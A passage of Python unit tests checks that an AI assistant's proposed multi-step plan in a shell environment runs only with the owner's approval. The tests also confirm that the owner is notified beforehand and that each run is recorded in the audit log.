        ai2 = self.layer(sh2, "assistant", "plain", (0, 0, 10, 10), system=True, scopes=frozenset({"apps"}), assistant=True)
        ran2 = []
        sh2.open_window = lambda name, cmd=None, **kw: ran2.append(name)
        sh2._on_request(ai2, plan)                                                                    # ...and a plan still has to ask, with none left to give
        self.assertEqual(ran2, [])

    def test_an_approved_plan_runs_each_step_as_the_assistant_and_tells_the_owner_first(self):
        sh = self.shell(PW)
        ai = self.layer(sh, "assistant", "plain", (0, 0, 10, 10), system=True, scopes=frozenset({"apps"}), assistant=True)
        ran = []
        sh.open_window = lambda name, cmd=None, **kw: ran.append(name)
        sh._on_request(ai, {"cmd": "request", "action": "propose", "title": "look around", "steps": [
            {"action": "open", "app": "files", "mode": "graphical"}, {"action": "open", "app": "processes", "mode": "graphical"}]})
        self.assertEqual(ran, ["files", "processes"])
        self.assertTrue(any("awaiting your approval" in n["title"] for n in sh.notes))              # shown to the owner before it asked
        msg = [m for m in self.sent(ai) if m.get("cmd") == "result" and m["action"] == "propose"][-1]
        self.assertTrue(msg["ok"])
        self.assertIn("ran 2", msg["detail"])
        entries = [e["action"] for e in self.authority(PW).audit.entries()]
        self.assertIn("assistant.plan", entries)                                                    # and it is in the audit log
